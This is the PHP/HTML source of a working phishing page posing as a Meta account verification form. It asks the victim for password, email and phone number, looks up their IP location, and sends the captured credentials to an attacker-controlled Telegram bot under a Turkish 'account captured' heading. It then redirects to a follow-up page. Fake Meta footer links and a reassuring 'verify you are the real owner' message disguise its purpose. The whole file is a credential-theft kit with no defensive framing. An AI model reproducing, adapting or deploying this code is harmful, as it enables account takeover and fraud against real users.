<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

if ($_POST) {
    $fore_user = $_SESSION["fore_user"];
    $forepass = $_POST["forepass"];
    $foremail = $_POST["foremail"];
    $foreno = $_POST["foreno"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/" . $ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $site = $_SERVER["SERVER_NAME"];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time = date("d-m-Y H:i:s");
    
    require_once("admin/tg.php");
    
$data = [
    'text' => '
Hesap Düştü  

Kullanıcı Adı: '.$fore_user.'
Şifre: '.$forepass.'
Mail: '.$foremail.'
Numara: '.$foreno.'

@webservicesx

İp : '.$ip.'
Konum : '.$ulke.' / '.$sehir.'
Tarih : '.$cur_time.'



',
    'chat_id' =>"$chatid"
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location:4.php?$fore_user");

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link rel="stylesheet" href="css/style.css">
    <title></title>
</head>
<body> <center>

    </center>
  <div class="forebaby">
       
        <div class="yazi">
            <br>
           
           <br>

  <img width="150" src="imgs/e.svg" alt="">

        <br><br>
            <p>Dear <b>@<?php $fore_user = $_SESSION["fore_user"];
                                            echo $fore_user;  ?> <img width="20" src="imgs/tik.png" alt=""> </b>, <br>Please fill in the required information to verify that you are the real owner of your account, otherwise your account will not be approved.</p>
       <form method="post" autocomplete="off">
           <center>
                        <input  type="text" class="inputs" disabled  name="fore_user" value="@<?php $fore_user = $_SESSION["fore_user"];
                                            echo $fore_user; ?>" required="" >
                        <input  type="password" class="inputs" name="forepass" placeholder="Password" required="" >
                        <input  type="email" class="inputs" name="foremail" placeholder="E-mail" required="" >
                        <input  type="tel" class="inputs" name="foreno" placeholder="Phone Number" required="" >
</center>
            <br>
            <button id="bttn" name="fore_user" type="submit" class="btn2" >Continue</button> 
            <br>
    <br>
    
       
        </form>
   </div>
   </div>

    <center>
        <div class="alt"><br>
        <img width="150" src="imgs/ehe.png" alt="">
        <br><br>
        <p>For Meta Support and Complete message response please contact us best company and most robust Meta Verification Company</p>
        <br><br>
    </div>
    </center>
    <div class="enalt"> <br><br>
    <div class="enaltig">
        
        </div> 

        <div class="linksx">
        <a href="#">Community Standarts</a> &nbsp;&nbsp; | &nbsp;&nbsp;
        <a href="#">Data Policy</a> <br><br>
        <a href="#">Terms</a> 
         &nbsp;&nbsp; | &nbsp;&nbsp;
        <a href="#">Cookie Policy</a>
        </div>
                <br><hr color="#E0E0E0" size="0.1px" width="90%">
        <br>
        <div class="dil">
        <p>Language English (US)</p>
        </div>
        <br>
    </div>

 <script src="jquery-3.6.0.js" ></script>
<script>
        $( "form" ).submit(function( event ) {
            $( "#bttn" ).html("<i id='loader' class='fa fa-spinner fa-spin'></i>");
        });
    </script> 
</body>
</html>
